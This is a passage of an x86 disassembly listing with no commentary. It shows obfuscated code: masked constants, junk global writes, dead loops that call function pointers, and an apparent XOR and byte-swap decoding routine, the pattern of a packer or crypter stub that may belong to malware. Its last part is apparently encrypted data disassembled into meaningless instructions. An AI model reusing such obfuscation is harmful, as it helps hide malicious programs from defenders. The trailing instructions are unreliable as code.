  407f76:	or     DWORD PTR ds:0x42a2fa,0xa4f
  407f80:	xor    ecx,esi
  407f82:	or     DWORD PTR ds:0x42a26a,0x42a2f6
  407f8c:	add    eax,edi
  407f8e:	add    ecx,edi
  407f90:	mov    BYTE PTR [ebp-0x21],dl
  407f93:	cmp    eax,ecx
  407f95:	jae    0x408098
  407f9b:	add    edx,DWORD PTR ds:0x42a2a2
  407fa1:	lea    ecx,[eax-0x3272f1]
  407fa7:	mov    DWORD PTR [ebp-0x14],ecx
  407faa:	sub    DWORD PTR ds:0x42a27a,0x2374
  407fb4:	mov    edx,DWORD PTR [ebp-0x14]
  407fb7:	add    DWORD PTR ds:0x42a2a2,0x6412
  407fc1:	xor    edx,esi
  407fc3:	add    edx,0x7f55d8fb
  407fc9:	lea    ecx,[ebp+eax*4-0xb4]
  407fd0:	mov    DWORD PTR ds:0x42a25a,0x798e
  407fda:	mov    DWORD PTR [ecx],edx
  407fdc:	mov    edx,0x1097
  407fe1:	mov    edx,DWORD PTR [ecx]
  407fe3:	cmp    edx,0x244ecb98
  407fe9:	jbe    0x408004
  407fef:	xor    DWORD PTR ds:0x42a29a,0x42a2d6
  407ff9:	add    DWORD PTR [ecx],0x405fcd9
  407fff:	jmp    0x40800a
  408004:	add    DWORD PTR [ecx],0xfdaf4327
  40800a:	or     DWORD PTR ds:0x42a2f6,edi
  408010:	mov    ecx,DWORD PTR [ebp-0x18]
  408013:	xor    ecx,esi
  408015:	and    DWORD PTR ds:0x42a25e,0x42a27a
  40801f:	inc    eax
  408020:	and    DWORD PTR ds:0x42a2aa,0x42a2a6
  40802a:	inc    DWORD PTR [ebp-0x14]
  40802d:	add    ecx,edi
  40802f:	mov    DWORD PTR ds:0x42a2f6,0x14dc
  408039:	cmp    eax,ecx
  40803b:	mov    DWORD PTR ds:0x42a2fe,0x33af
  408045:	jb     0x407faa
  40804b:	and    DWORD PTR ds:0x42a25e,0x0
  408055:	mov    eax,ds:0x42a25e
  40805a:	inc    eax
  40805b:	mov    ds:0x42a25e,eax
  408060:	cmp    DWORD PTR ds:0x42a25e,0x1c
  408067:	jb     0x408095
  40806d:	jmp    0x408088
  408072:	push   0x6d6b
  408077:	push   0x44a2
  40807c:	push   DWORD PTR [ebp-0x14]
  40807f:	push   DWORD PTR [ebp-0x18]
  408082:	call   DWORD PTR ds:0x42a3de
  408088:	cmp    DWORD PTR ds:0x42a25e,0x18
  40808f:	jb     0x408055
  408095:	mov    dl,BYTE PTR [ebp-0x21]
  408098:	mov    eax,DWORD PTR [ebp-0x34]
  40809b:	xor    al,0xaa
  40809d:	mov    cl,0xf
  40809f:	xor    DWORD PTR ds:0x42a2b2,0x7a5d
  4080a9:	sub    cl,al
  4080ab:	add    dl,cl
  4080ad:	mov    ecx,DWORD PTR [ebp-0x1c]
  4080b0:	xor    DWORD PTR ds:0x42a2d2,0x74a5
  4080ba:	xor    cl,0xaa
  4080bd:	xor    DWORD PTR ds:0x42a296,0x4bb3
  4080c7:	sub    cl,0xf
  4080ca:	add    DWORD PTR ds:0x42a2d6,0x42a2da
  4080d4:	ror    dl,cl
  4080d6:	sub    ecx,0x38f7
  4080dc:	xor    eax,eax
  4080de:	xor    DWORD PTR ds:0x42a2d2,0x8c7
  4080e8:	mov    eax,DWORD PTR [ebp-0xc]
  4080eb:	dec    DWORD PTR ds:0x42a266
  4080f1:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  4080f8:	and    DWORD PTR ds:0x42a296,0x0
  408102:	mov    eax,ds:0x42a296
  408107:	inc    eax
  408108:	mov    ds:0x42a296,eax
  40810d:	cmp    DWORD PTR ds:0x42a296,0x27
  408114:	ja     0x408132
  40811a:	jmp    0x408125
  40811f:	call   DWORD PTR ds:0x42a3e2
  408125:	cmp    DWORD PTR ds:0x42a296,0x1b
  40812c:	jb     0x408102
  408132:	mov    eax,DWORD PTR [ebp-0xc]
  408135:	xor    ecx,DWORD PTR ds:0x42a2c6
  40813b:	mov    ecx,DWORD PTR [ebp-0x28]
  40813e:	sub    DWORD PTR ds:0x42a2ce,0x42a2f2
  408148:	sub    eax,edi
  40814a:	and    DWORD PTR ds:0x42a25a,0x42a2f2
  408154:	xor    eax,esi
  408156:	mov    DWORD PTR ds:0x42a296,0x3de6
  408160:	cmp    eax,ecx
  408162:	mov    DWORD PTR ds:0x42a292,0x568e
  40816c:	jne    0x408200
  408172:	add    ecx,eax
  408174:	mov    eax,DWORD PTR [ebp-0x8]
  408177:	and    DWORD PTR ds:0x42a2ee,0x0
  408181:	mov    ecx,DWORD PTR ds:0x42a2ee
  408187:	inc    ecx
  408188:	mov    DWORD PTR ds:0x42a2ee,ecx
  40818e:	cmp    DWORD PTR ds:0x42a2ee,0x6
  408195:	jbe    0x4081df
  40819b:	jmp    0x4081b8
  4081a0:	push   0x42a296
  4081a5:	push   DWORD PTR [ebp-0x20]
  4081a8:	push   0x42903c
  4081ad:	push   0x4290aa
  4081b2:	call   DWORD PTR ds:0x42a3ea
  4081b8:	cmp    DWORD PTR ds:0x42a2ee,0x5
  4081bf:	jne    0x4081d2
  4081c5:	mov    ecx,DWORD PTR ds:0x42a2ee
  4081cb:	inc    ecx
  4081cc:	mov    DWORD PTR ds:0x42a2ee,ecx
  4081d2:	cmp    DWORD PTR ds:0x42a2ee,0x15
  4081d9:	jb     0x408181
  4081df:	mov    ecx,DWORD PTR [ebp-0x10]
  4081e2:	xor    eax,esi
  4081e4:	xor    ecx,esi
  4081e6:	sub    eax,ecx
  4081e8:	sub    eax,edi
  4081ea:	xor    eax,esi
  4081ec:	mov    DWORD PTR [ebp-0x8],eax
  4081ef:	mov    eax,DWORD PTR [ebp-0x10]
  4081f2:	xor    eax,esi
  4081f4:	mov    ecx,0xffcd8d8f
  4081f9:	sub    ecx,eax
  4081fb:	jmp    0x40820f
  408200:	mov    eax,DWORD PTR [ebp-0x10]
  408203:	xor    eax,esi
  408205:	mov    ecx,0xffcd8d0f
  40820a:	sub    ecx,eax
  40820c:	add    ecx,DWORD PTR [ebp-0xc]
  40820f:	mov    DWORD PTR [ebp-0xc],ecx
  408212:	mov    eax,DWORD PTR [ebp-0x8]
  408215:	cmp    eax,0xf89c85a5
  40821a:	jne    0x4037d5
  408220:	mov    DWORD PTR [ebp-0x34],0x9
  408227:	mov    ecx,DWORD PTR [ebp+0x8]
  40822a:	xor    ecx,esi
  40822c:	add    ecx,edi
  40822e:	jmp    0x40848e
  408233:	lea    eax,[ecx+ebx*1]
  408236:	mov    DWORD PTR [ebp-0x2c],eax
  408239:	mov    eax,DWORD PTR [ebp-0x58]
  40823c:	sub    eax,ecx
  40823e:	mov    DWORD PTR [ebp-0x1c],eax
  408241:	mov    eax,DWORD PTR [ebp-0x1c]
  408244:	mov    DWORD PTR [ebp-0x14],eax
  408247:	mov    eax,DWORD PTR [ebp-0x2c]
  40824a:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  408251:	mov    DWORD PTR [ebp-0x54],eax
  408254:	mov    DWORD PTR [ebp-0x20],0xf89c85ba
  40825b:	mov    eax,DWORD PTR [ebp-0x38]
  40825e:	xor    eax,esi
  408260:	add    eax,edi
  408262:	mov    DWORD PTR [ebp-0x10],eax
  408265:	mov    eax,DWORD PTR [ebp-0x38]
  408268:	xor    eax,esi
  40826a:	add    eax,edi
  40826c:	mov    DWORD PTR [ebp-0x8],eax
  40826f:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  408276:	mov    DWORD PTR [ebp-0x44],0xf89c85bc
  40827d:	mov    eax,DWORD PTR [ebp-0x38]
  408280:	mov    edx,DWORD PTR [ebp-0x14]
  408283:	xor    eax,esi
  408285:	add    eax,edi
  408287:	cmp    edx,eax
  408289:	je     0x408482
  40828f:	mov    eax,DWORD PTR [ebp-0x20]
  408292:	xor    eax,esi
  408294:	mov    edx,0xffcd8d0f
  408299:	sub    edx,eax
  40829b:	add    edx,DWORD PTR [ebp-0x14]
  40829e:	mov    eax,DWORD PTR [ebp-0x20]
  4082a1:	mov    ebx,DWORD PTR [ebp-0x10]
  4082a4:	xor    eax,esi
  4082a6:	add    eax,edi
  4082a8:	imul   eax,ebx
  4082ab:	cmp    eax,edx
  4082ad:	ja     0x40847f
  4082b3:	mov    edx,DWORD PTR [ebp-0x10]
  4082b6:	mov    eax,DWORD PTR [ebp-0x14]
  4082b9:	mov    ebx,DWORD PTR [ebp-0x2c]
  4082bc:	sub    eax,edx
  4082be:	xor    ebx,esi
  4082c0:	xor    edx,edx
  4082c2:	add    ebx,edi
  4082c4:	div    ebx
  4082c6:	mov    DWORD PTR [ebp-0x8],eax
  4082c9:	mov    eax,DWORD PTR [ebp-0x44]
  4082cc:	mov    edx,DWORD PTR [ebp-0x8]
  4082cf:	xor    eax,esi
  4082d1:	add    eax,edi
  4082d3:	cmp    edx,eax
  4082d5:	jbe    0x4082e5
  4082db:	mov    eax,DWORD PTR [ebp-0x44]
  4082de:	xor    eax,esi
  4082e0:	add    eax,edi
  4082e2:	mov    DWORD PTR [ebp-0x8],eax
  4082e5:	mov    eax,DWORD PTR [ebp-0x2c]
  4082e8:	mov    edx,DWORD PTR [ebp-0x8]
  4082eb:	xor    eax,esi
  4082ed:	add    eax,edi
  4082ef:	imul   eax,edx
  4082f2:	mov    DWORD PTR [ebp-0x8],eax
  4082f5:	mov    eax,DWORD PTR [ebp-0x38]
  4082f8:	mov    edx,DWORD PTR [ebp-0x8]
  4082fb:	xor    eax,esi
  4082fd:	add    eax,edi
  4082ff:	cmp    edx,eax
  408301:	je     0x408468
  408307:	mov    eax,DWORD PTR [ebp-0x8]
  40830a:	mov    DWORD PTR [ebp-0x18],eax
  40830d:	mov    eax,DWORD PTR [ebp-0x10]
  408310:	add    eax,DWORD PTR [ebp-0x54]
  408313:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  40831a:	mov    DWORD PTR [ebp-0x8],eax
  40831d:	mov    eax,0xf89c85ba
  408322:	mov    DWORD PTR [ebp-0x28],eax
  408325:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  40832c:	mov    DWORD PTR [ebp-0x40],0xf89c85b8
  408333:	mov    DWORD PTR [ebp-0x30],eax
  408336:	mov    eax,DWORD PTR [ebp-0x1c]
  408339:	xor    eax,esi
  40833b:	add    eax,edi
  40833d:	jmp    0x408424
  408342:	mov    DWORD PTR [ebp-0x4c],0xf89c85b0
  408349:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  408350:	mov    eax,DWORD PTR [ebp-0x30]
  408353:	mov    edx,DWORD PTR [ebp-0xc]
  408356:	xor    eax,esi
  408358:	add    eax,edi
  40835a:	imul   eax,edx
  40835d:	mov    edx,DWORD PTR [ebp-0x8]
  408360:	mov    al,BYTE PTR [eax+edx*1]
  408363:	mov    BYTE PTR [ebp-0x1],al
  408366:	mov    eax,DWORD PTR [ebp-0x30]
  408369:	mov    edx,DWORD PTR [ebp-0xc]
  40836c:	xor    eax,esi
  40836e:	add    eax,edi
  408370:	imul   eax,edx
  408373:	mov    edx,DWORD PTR [ebp-0x5c]
  408376:	xor    edx,esi
  408378:	add    eax,edx
  40837a:	mov    edx,DWORD PTR [ebp-0x8]
  40837d:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f1]
  408385:	mov    edx,DWORD PTR [ebp-0x4c]
  408388:	xor    edx,esi
  40838a:	lea    eax,[edx+eax*1+0x3272f1]
  408391:	movzx  edx,BYTE PTR [ebp-0x1]
  408395:	xor    edx,eax
  408397:	mov    BYTE PTR [ebp-0x1],dl
  40839a:	mov    al,BYTE PTR [ebp-0x1]
  40839d:	mov    edx,DWORD PTR [ebp-0x30]
  4083a0:	mov    ebx,DWORD PTR [ebp-0xc]
  4083a3:	xor    edx,esi
  4083a5:	add    edx,edi
  4083a7:	imul   edx,ebx
  4083aa:	mov    ebx,DWORD PTR [ebp-0x8]
  4083ad:	mov    BYTE PTR [edx+ebx*1],al
  4083b0:	mov    eax,DWORD PTR [ebp-0x30]
  4083b3:	mov    edx,DWORD PTR [ebp-0xc]
  4083b6:	xor    eax,esi
  4083b8:	add    eax,edi
  4083ba:	imul   eax,edx
  4083bd:	mov    edx,DWORD PTR [ebp-0x8]
  4083c0:	mov    al,BYTE PTR [eax+edx*1]
  4083c3:	mov    BYTE PTR [ebp-0x1],al
  4083c6:	mov    eax,DWORD PTR [ebp-0x30]
  4083c9:	mov    edx,DWORD PTR [ebp-0xc]
  4083cc:	xor    eax,esi
  4083ce:	add    eax,edi
  4083d0:	imul   eax,edx
  4083d3:	mov    edx,DWORD PTR [ebp-0x28]
  4083d6:	xor    edx,esi
  4083d8:	add    eax,edx
  4083da:	mov    edx,DWORD PTR [ebp-0x8]
  4083dd:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f1]
  4083e5:	mov    edx,DWORD PTR [ebp-0x50]
  4083e8:	xor    edx,esi
  4083ea:	lea    eax,[edx+eax*1+0x3272f1]
  4083f1:	movzx  edx,BYTE PTR [ebp-0x1]
  4083f5:	xor    edx,eax
  4083f7:	mov    BYTE PTR [ebp-0x1],dl
  4083fa:	mov    al,BYTE PTR [ebp-0x1]
  4083fd:	mov    edx,DWORD PTR [ebp-0x30]
  408400:	mov    ebx,DWORD PTR [ebp-0xc]
  408403:	xor    edx,esi
  408405:	add    edx,edi
  408407:	imul   edx,ebx
  40840a:	mov    ebx,DWORD PTR [ebp-0x8]
  40840d:	mov    BYTE PTR [edx+ebx*1],al
  408410:	mov    eax,DWORD PTR [ebp-0x40]
  408413:	mov    edx,DWORD PTR [ebp-0x28]
  408416:	xor    eax,esi
  408418:	xor    edx,esi
  40841a:	add    eax,edi
  40841c:	add    edx,edi
  40841e:	imul   eax,edx
  408421:	add    eax,DWORD PTR [ebp-0xc]
  408424:	mov    DWORD PTR [ebp-0xc],eax
  408427:	mov    eax,DWORD PTR [ebp-0xc]
  40842a:	mov    edx,DWORD PTR [ebp-0x18]
  40842d:	cmp    edx,eax
  40842f:	jb     0x408342
  408435:	mov    eax,DWORD PTR [ebp-0x28]
  408438:	mov    edx,DWORD PTR [ebp-0x18]
  40843b:	xor    eax,esi
  40843d:	add    eax,edi
  40843f:	imul   eax,edx
  408442:	mov    edx,DWORD PTR [ebp-0x1c]
  408445:	xor    edx,esi
  408447:	add    edx,edi
  408449:	or     eax,edx
  40844b:	mov    edx,DWORD PTR [ebp-0x20]
  40844e:	xor    edx,esi
  408450:	add    eax,edx
  408452:	mov    edx,DWORD PTR [ebp-0x20]
  408455:	xor    edx,esi
  408457:	add    eax,edx
  408459:	mov    edx,DWORD PTR [ebp-0x10]
  40845c:	lea    eax,[eax+edx*1+0x64e5e2]
  408463:	jmp    0x408477
  408468:	mov    eax,DWORD PTR [ebp-0x20]
  40846b:	mov    edx,DWORD PTR [ebp-0x10]
  40846e:	xor    eax,esi
  408470:	lea    eax,[eax+edx*1+0x3272f1]
  408477:	mov    DWORD PTR [ebp-0x10],eax
  40847a:	jmp    0x40828f
  40847f:	mov    ebx,DWORD PTR [ebp-0x3c]
  408482:	mov    eax,DWORD PTR [ebp+0xc]
  408485:	xor    eax,esi
  408487:	lea    ecx,[ecx+eax*1+0x3272f1]
  40848e:	lea    eax,[ecx-0x3272f1]
  408494:	xor    eax,esi
  408496:	cmp    eax,0xf89c95a5
  40849b:	jne    0x408233
  4084a1:	dec    DWORD PTR [ebp-0x34]
  4084a4:	jne    0x408227
  4084aa:	mov    eax,DWORD PTR [ebp+0x8]
  4084ad:	mov    ecx,DWORD PTR [ebp+0xc]
  4084b0:	mov    edx,DWORD PTR [ebp+0x8]
  4084b3:	xor    ecx,esi
  4084b5:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f1]
  4084bc:	xor    eax,esi
  4084be:	mov    al,BYTE PTR [eax+ebx*1+0x3272f1]
  4084c5:	xor    edx,esi
  4084c7:	mov    BYTE PTR [edx+ebx*1+0x3272f1],cl
  4084ce:	mov    ecx,DWORD PTR [ebp+0xc]
  4084d1:	xor    ecx,esi
  4084d3:	mov    BYTE PTR [ecx+ebx*1+0x3272f1],al
  4084da:	mov    eax,DWORD PTR [ebp+0xc]
  4084dd:	xor    eax,esi
  4084df:	add    eax,edi
  4084e1:	pop    edi
  4084e2:	pop    esi
  4084e3:	pop    ebx
  4084e4:	leave  
  4084e5:	ret    0x8
  4084e8:	xor    eax,eax
  4084ea:	and    DWORD PTR ds:0x42a2f6,0x42a2fa
  4084f4:	inc    eax
  4084f5:	ret    
  4084f6:	push   ebp
  4084f7:	mov    ebp,esp
  4084f9:	sub    esp,0x38
  4084fc:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  408503:	push   ebx
  408504:	mov    DWORD PTR ds:0x42a29a,0x1c
  40850e:	cmp    DWORD PTR ds:0x42a29a,0x0
  408515:	je     0x408551
  40851b:	cmp    DWORD PTR ds:0x42a29a,0x21
  408522:	jg     0x408551
  408528:	jmp    0x40853e
  40852d:	push   DWORD PTR [ebp-0x28]
  408530:	push   0x42a2b2
  408535:	push   DWORD PTR [ebp-0x18]
  408538:	call   DWORD PTR ds:0x42a3ee
  40853e:	xor    eax,eax
  408540:	xor    eax,DWORD PTR ds:0x42a29a
  408546:	dec    eax
  408547:	mov    ds:0x42a29a,eax
  40854c:	jmp    0x40850e
  408551:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  408558:	and    DWORD PTR ds:0x42a292,ebx
  40855e:	mov    eax,DWORD PTR [ebp-0x4]
  408561:	push   esi
  408562:	mov    esi,0x75108aa
  408567:	sub    DWORD PTR ds:0x42a28a,0x606e
  408571:	xor    eax,esi
  408573:	push   edi
  408574:	mov    edi,0x3272f1
  408579:	add    eax,edi
  40857b:	add    DWORD PTR ds:0x42a28e,0x42a2ae
  408585:	mov    DWORD PTR [ebp-0x1c],eax
  408588:	mov    eax,DWORD PTR [ebp+0x14]
  40858b:	xor    DWORD PTR ds:0x42a2de,0x42a302
  408595:	test   eax,eax
  408597:	je     0x4085af
  40859d:	mov    eax,DWORD PTR [ebp+0x14]
  4085a0:	adc    DWORD PTR ds:0x42a26e,0x42a2ca
  4085aa:	mov    eax,DWORD PTR [eax]
  4085ac:	mov    DWORD PTR [ebp-0x1c],eax
  4085af:	mov    ebx,DWORD PTR ds:0x42a256
  4085b5:	and    DWORD PTR ds:0x42a2e6,ebx
  4085bb:	mov    eax,DWORD PTR [ebp-0x4]
  4085be:	xor    eax,esi
  4085c0:	adc    DWORD PTR ds:0x42a2c6,0x7b40
  4085ca:	add    eax,edi
  4085cc:	xor    DWORD PTR ds:0x42a2c6,0x5a4b
  4085d6:	mov    DWORD PTR [ebp-0x8],eax
  4085d9:	mov    eax,DWORD PTR [ebp-0xc]
  4085dc:	dec    DWORD PTR ds:0x42a2be
  4085e2:	xor    eax,esi
  4085e4:	add    eax,edi
  4085e6:	and    DWORD PTR ds:0x42a2be,0x0
  4085f0:	jmp    0x408602
  4085f5:	mov    ebx,DWORD PTR ds:0x42a2be
  4085fb:	inc    ebx
  4085fc:	mov    DWORD PTR ds:0x42a2be,ebx
  408602:	cmp    DWORD PTR ds:0x42a2be,0x13
  408609:	jae    0x408650
  40860f:	cmp    DWORD PTR ds:0x42a2be,0x4
  408616:	jb     0x408650
  40861c:	jmp    0x408631
  408621:	push   0x68db
  408626:	push   0x42a266
  40862b:	call   DWORD PTR ds:0x42a3f2
  408631:	cmp    DWORD PTR ds:0x42a2be,0x3
  408638:	jne    0x40864b
  40863e:	mov    ebx,DWORD PTR ds:0x42a2be
  408644:	inc    ebx
  408645:	mov    DWORD PTR ds:0x42a2be,ebx
  40864b:	jmp    0x4085f5
  408650:	mov    DWORD PTR [ebp-0x24],eax
  408653:	mov    ebx,DWORD PTR ds:0x42a316
  408659:	mov    ebx,DWORD PTR [ebx]
  40865b:	xor    DWORD PTR ds:0x42a2ae,ebx
  408661:	mov    eax,DWORD PTR [ebp-0x4]
  408664:	mov    DWORD PTR ds:0x42a2fa,0x14
  40866e:	cmp    DWORD PTR ds:0x42a2fa,0x0
  408675:	je     0x4086aa
  40867b:	cmp    DWORD PTR ds:0x42a2fa,0x16
  408682:	jbe    0x4086aa
  408688:	jmp    0x408698
  40868d:	push   0x42a256
  408692:	call   DWORD PTR ds:0x42a3f6
  408698:	mov    ebx,DWORD PTR ds:0x42a2fa
  40869e:	dec    ebx
  40869f:	mov    DWORD PTR ds:0x42a2fa,ebx
  4086a5:	jmp    0x40866e
  4086aa:	xor    eax,esi
  4086ac:	movzx  ebx,BYTE PTR ds:0x42a2aa
  4086b3:	adc    ebx,DWORD PTR ds:0x42a2de
  4086b9:	mov    DWORD PTR ds:0x42a2aa,ebx
  4086bf:	add    eax,edi
  4086c1:	mov    DWORD PTR ds:0x42a29e,0x16
  4086cb:	cmp    DWORD PTR ds:0x42a29e,0x0
  4086d2:	je     0x408713
  4086d8:	cmp    DWORD PTR ds:0x42a29e,0x1e
  4086df:	jle    0x408713
  4086e5:	jmp    0x4086ff
  4086ea:	push   0x8495
  4086ef:	push   0x42a2a2
  4086f4:	push   0x13ea
  4086f9:	call   DWORD PTR ds:0x42a3fa
  4086ff:	xor    ebx,ebx
  408701:	add    ebx,DWORD PTR ds:0x42a29e
  408707:	dec    ebx
  408708:	mov    DWORD PTR ds:0x42a29e,ebx
  40870e:	jmp    0x4086cb
  408713:	mov    DWORD PTR [ebp-0x30],eax
  408716:	sub    DWORD PTR ds:0x42a2b2,0x244c
  408720:	mov    ebx,DWORD PTR [ebp-0x4]
  408723:	xor    ebx,esi
  408725:	neg    DWORD PTR ds:0x42a2f6
  40872b:	add    ebx,edi
  40872d:	and    DWORD PTR ds:0x42a2ba,0x0
  408737:	xor    eax,eax
  408739:	or     eax,DWORD PTR ds:0x42a2ba
  40873f:	inc    eax
  408740:	mov    ds:0x42a2ba,eax
  408745:	cmp    DWORD PTR ds:0x42a2ba,0x6
  40874c:	jg     0x408791
  408752:	jmp    0x40876c
  408757:	push   0x385f
  40875c:	push   0x7a18
  408761:	push   0x5bac
  408766:	call   DWORD PTR ds:0x42a402
  40876c:	cmp    DWORD PTR ds:0x42a2ba,0x5
  408773:	jne    0x408784
  408779:	mov    eax,ds:0x42a2ba
  40877e:	inc    eax
  40877f:	mov    ds:0x42a2ba,eax
  408784:	cmp    DWORD PTR ds:0x42a2ba,0x13
  40878b:	jb     0x408737
  408791:	mov    eax,DWORD PTR [ebp-0x24]
  408794:	add    DWORD PTR ds:0x42a27e,0x42a26e
  40879e:	sub    eax,edi
  4087a0:	lea    ecx,[ebx-0x3272f1]
  4087a6:	xor    eax,esi
  4087a8:	sbb    DWORD PTR ds:0x42a286,0x7a3b
  4087b2:	jmp    0x40ab40
  4087b7:	inc    esp
  4087b8:	arpl   WORD PTR [esi+esi*8],di
  4087bb:	and    al,0x96
  4087bd:	xchg   ch,cl
  4087bf:	sahf   
  4087c0:	pushf  
  4087c1:	ja     0x4087a5
  4087c3:	dec    ebx
  4087c4:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4087c6:	push   edx
  4087c7:	iret   
  4087c8:	adc    al,0x83
  4087ca:	or     DWORD PTR [esi+ebx*2],0xffffff83
  4087ce:	xor    DWORD PTR [edx+0x53d6894d],0xffffffdf
  4087d5:	mov    esi,0xe7beb843
  4087da:	pmulhuw mm0,QWORD PTR [edx+edi*1-0x70b7a4d7]
  4087e2:	xor    eax,0x720f38c2
  4087e7:	mov    ebp,0x3528b96a
  4087ec:	xchg   esp,eax
  4087ed:	rol    ebp,0xdf
  4087f0:	cli    
  4087f1:	out    dx,al
  4087f2:	imul   edi,ebx,0xe
  4087f5:	in     eax,dx
  4087f6:	sbb    ebx,DWORD PTR [ecx+0x2d436989]
  4087fc:	mov    ah,0x1e
  4087fe:	and    al,0x54
  408800:	neg    bh
  408802:	mov    ch,0x9
  408804:	aaa    
  408805:	out    dx,al
  408806:	pop    ebx
  408807:	mov    eax,ds:0xbcd0e078
  40880c:	inc    ebp
  40880d:	fdivp  st(3),st
  40880f:	or     ecx,edi
  408811:	sbb    eax,0xe03809b1
  408816:	sub    eax,0x12352cc5
  40881b:	cdq    
  40881c:	pop    esp
  40881d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40881e:	or     eax,DWORD PTR ds:0x1ad9bdf4
  408824:	dec    esp
  408825:	adc    al,0xf7
  408827:	dec    ebx
  408828:	push   0xc6c491bd
  40882d:	fld    TBYTE PTR [esi-0x141af13f]
  408833:	dec    esi
  408834:	shl    DWORD PTR [esi],0xc5
  408837:	(bad)  
  408838:	imul   edx,ebp,0xe9f1d64a
  40883e:	loop   0x408891
  408840:	sahf   
  408841:	xor    ecx,DWORD PTR [eax+0x4f30b9e6]
  408847:	mov    dh,0xb5
  408849:	sbb    dl,BYTE PTR [esi]
  40884b:	scas   eax,DWORD PTR es:[edi]
  40884c:	call   0x4e36959c
  408851:	lock push 0xffffffd3
  408854:	loope  0x4088c4
  408856:	push   0xbd797e
  40885b:	or     ecx,DWORD PTR [ebx-0x7e]
  40885e:	push   es
  40885f:	in     al,dx
  408860:	test   DWORD PTR [ecx+0x2f8241c8],ebp
  408866:	jne    0x408850
  408868:	sbb    bl,ch
  40886a:	int3   
  40886b:	jmp    0x8aa5a85c
  408870:	aad    0xf3
  408872:	lods   eax,DWORD PTR ds:[esi]
  408873:	stos   DWORD PTR es:[edi],eax
  408874:	and    BYTE PTR ds:0x9047fa1,0x60
  40887b:	and    al,0x4c
  40887d:	jne    0x4088a2
  40887f:	cmp    al,0xc6
  408881:	push   ds
  408882:	gs loop 0x4088f0
  408885:	push   ss
  408886:	(bad)  
  408887:	sbb    al,0x16
  408889:	xchg   ebx,eax
  40888a:	rol    al,cl
  40888c:	pop    edi
  40888d:	cmp    ecx,DWORD PTR [eax-0x67]
  408890:	sar    BYTE PTR [ebx-0x3],1
  408893:	shl    DWORD PTR [edi-0x390a7cb7],0xd7
  40889a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40889b:	jns    0x40881f
  40889d:	imul   ecx,DWORD PTR [ecx-0x7a],0xbeb5639
  4088a4:	mov    edx,0xcda1967d
  4088a9:	and    BYTE PTR [esi],bl
  4088ab:	and    BYTE PTR [ecx-0x16],ah
  4088ae:	lock fstp DWORD PTR [edx]
  4088b1:	stc    
  4088b2:	(bad)  
  4088b4:	or     ch,BYTE PTR [ecx+esi*8-0x1b]
  4088b8:	fwait
  4088b9:	repz sbb eax,0x123a47d8
  4088bf:	sbb    ax,0xb6da
  4088c3:	pop    ss
  4088c4:	imul   edi,DWORD PTR [edx-0x1e534037],0x5d
  4088cb:	sti    
  4088cc:	and    al,BYTE PTR [ebx]
  4088ce:	inc    ecx
  4088cf:	loope  0x4088eb
  4088d1:	je     0x4088c3
  4088d3:	mov    edx,0xb554eb46
  4088d8:	cmp    dh,dl
  4088da:	imul   esi,DWORD PTR [esi+0x7cca74af],0x5
  4088e1:	(bad)  
  4088e2:	fs test al,0x2f
  4088e5:	adc    bl,BYTE PTR [eax]
  4088e7:	cmp    ch,dh
  4088e9:	sar    DWORD PTR [eax],1
  4088eb:	jmp    FWORD PTR [eax+0x3b]
  4088ee:	push   esp
  4088ef:	hlt    
  4088f0:	mov    esi,0xb08a86a6
  4088f5:	pop    eax
  4088f6:	cs mov ah,0xf7
  4088f9:	ss mov eax,0x27064a08
  4088ff:	adc    bl,BYTE PTR [ebx+0x4c3798f1]
  408905:	jne    0x4088b2
  408907:	outs   dx,DWORD PTR ds:[esi]
  408908:	pop    ds
  408909:	jge    0x408985
  40890b:	je     0x40896f
  40890d:	jb     0x40893e
  40890f:	inc    edi
  408910:	push   es
  408911:	sbb    bh,BYTE PTR [eax-0x7f]
  408914:	jmp    0x68cc:0x52140ccc
  40891b:	fistp  QWORD PTR [ebx+ebp*4]
  40891e:	pop    esp
  40891f:	and    eax,0xb1f73c91
  408924:	not    BYTE PTR ds:0x5309e8db
  40892a:	inc    edi
  40892b:	jl     0x4088fe
  40892d:	ss stc 
  40892f:	or     al,0xc3
  408931:	pop    eax
  408932:	xor    eax,0x7b07da26
  408937:	stos   BYTE PTR es:[edi],al
  408938:	imul   edx,DWORD PTR fs:[esi],0xffffffc8
  40893c:	pop    edi
  40893d:	jbe    0x408964
  40893f:	test   BYTE PTR [edx+0x36a07e7a],bl
  408945:	jmp    0x9758:0x9abb8916
  40894c:	test   DWORD PTR [eax+edx*8+0x12],esp
  408950:	xchg   edx,eax
  408951:	dec    ecx
  408952:	xor    al,0xa7
  408954:	xchg   edi,eax
  408955:	mov    eax,0xb6ead6b7
  40895a:	inc    eax
  40895b:	je     0x40895f
  40895d:	out    0x59,al
  40895f:	xchg   edi,eax
  408960:	mov    esi,0x2a219ad2
  408965:	fld    TBYTE PTR [esi+0x102f8842]
  40896b:	sub    esp,DWORD PTR [edx+0x9]
  40896e:	mov    ch,0x67
  408970:	cmp    BYTE PTR [esi-0x4e0149e3],0x9f
  408977:	std    
  408978:	lods   al,BYTE PTR ds:[esi]
  408979:	fwait
  40897a:	add    eax,0x3be05bae
  40897f:	jns    0x408994
  408981:	test   BYTE PTR [edi+0x40],dl
  408984:	pop    edx
  408985:	ins    DWORD PTR es:[edi],dx
  408986:	(bad)  
  408987:	pop    es
  408988:	cmp    edx,0xffffffc9
  40898b:	jbe    0x40899c
  40898d:	loopne 0x408952
  40898f:	or     bh,BYTE PTR [ebp+edi*2+0x319deed0]
  408996:	outs   dx,DWORD PTR ds:[esi]
  408997:	dec    edx
  408998:	jno    0x4089f8
  40899a:	test   DWORD PTR [ecx+0x5a],ebp
  40899d:	push   ecx
  40899e:	jmp    0xc1bc63b9
  4089a3:	loope  0x4089a0
  4089a5:	sbb    ecx,DWORD PTR [edx+0x369ca407]
  4089ab:	mov    ds:0x2a615298,al
